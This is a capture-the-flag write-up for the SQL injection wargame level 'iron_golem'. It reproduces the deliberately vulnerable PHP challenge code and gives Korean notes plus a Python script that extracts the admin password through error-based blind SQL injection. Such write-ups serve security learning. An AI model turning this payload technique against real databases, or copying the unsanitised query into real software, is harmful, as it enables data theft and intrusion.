---
title : "LOS Lv.21 iron_golem"
categories : [Wargame, rubiya]
tags : [Error Based Blind SQL Injection]
---


## iron_golem 
```php
query : select id from prob_iron_golem where id='admin' and pw=''

<?php
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit(mysqli_error($db));
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

## Solution
```
if문을 통해 참이면 1 거짓이면 에러를 발생시키면 됨.
에러가 발생하면 다음과 같은 문장이 출력됨.
Subquery returns more than 1 row

비밀번호 길이는 32임.
```
```
또 다른 에러도 있음.
DOUBLE value is out of range in 'exp(710)

따라서 exp(710)을 이용해서 풀 수 있음.
```
```python
import requests

url='https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'PHPSESSID':'[redacted]'}

pw=''
bit_val=''

for i in range(1,33) :
    payload={'pw':"' or id='admin' and if(length(bin(ascii(substr(pw,"+str(i)+",1))))=7,1,(select 1 union select 2)) #"}
    res=requests.get(url,headers=headers, params=payload, cookies=cookies)
    if "Subquery returns more than 1 row" not in res.text :
        bit_len=7
    else :
        bit_len=6

    for j in range(1,bit_len+1) :
        payload={'pw':"' or id='admin' and if(substr(bin(ascii(substr(pw,"+str(i)+",1))),"+str(j)+",1)=0,1,(select 1 union select 2)) #"}
        res=requests.get(url,headers=headers, params=payload, cookies=cookies)
        if "Subquery returns more than 1 row" not in res.text :
            bit_val+='0'
        else :
            bit_val+='1'

    pw+=chr(int(bit_val,2))
    bit_val=''
    print("pw :",pw) # 06b5a6c16e8830475f983cc3a825ee9a
```
